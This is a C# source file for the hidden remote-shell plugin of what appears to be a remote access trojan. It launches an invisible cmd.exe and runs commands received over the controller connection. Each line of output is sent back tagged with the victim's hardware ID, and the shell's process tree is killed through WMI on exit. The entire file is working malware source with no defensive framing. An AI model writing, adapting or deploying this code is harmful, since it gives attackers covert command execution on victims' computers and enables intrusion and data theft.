using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;
using MessagePackLib.MessagePack;
using Plugin;

namespace Miscellaneous.Handler
{
    public static class HandleShell
    {
        public static Process ProcessShell;
        public static string Input { get; set; }
        public static bool CanWrite { get; set; }

        public static void ShellWriteLine(string arg)
        {
            Input = arg;
            CanWrite = true;
        }

        public static void StarShell()
        {
            ProcessShell = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))
                }
            };
            ProcessShell.OutputDataReceived += ShellDataHandler;
            ProcessShell.ErrorDataReceived += ShellDataHandler;
            ProcessShell.Start();
            ProcessShell.BeginOutputReadLine();
            ProcessShell.BeginErrorReadLine();
            while (Connection.IsConnected)
            {
                Thread.Sleep(1);
                if (CanWrite)
                {
                    if (Input.ToLower() == "exit") break;
                    ProcessShell.StandardInput.WriteLine(Input);
                    CanWrite = false;
                }
            }

            ShellClose();
        }

        private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
        {
            var Output = new StringBuilder();
            try
            {
                Output.AppendLine(e.Data);
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "shell";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("ReadInput").AsString = Output.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch
            {
            }
        }

        public static void ShellClose()
        {
            try
            {
                if (ProcessShell != null)
                {
                    KillProcessAndChildren(ProcessShell.Id);
                    ProcessShell.OutputDataReceived -= ShellDataHandler;
                    ProcessShell.ErrorDataReceived -= ShellDataHandler;
                    CanWrite = false;
                }
            }
            catch
            {
            }

            Connection.Disconnected();
        }

        private static void KillProcessAndChildren(int pid)
        {
            if (pid == 0) return;
            var searcher = new ManagementObjectSearcher
                ("Select * From Win32_Process Where ParentProcessID=" + pid);
            var moc = searcher.Get();
            foreach (ManagementObject mo in moc) KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            try
            {
                var proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch
            {
            }
        }
    }
}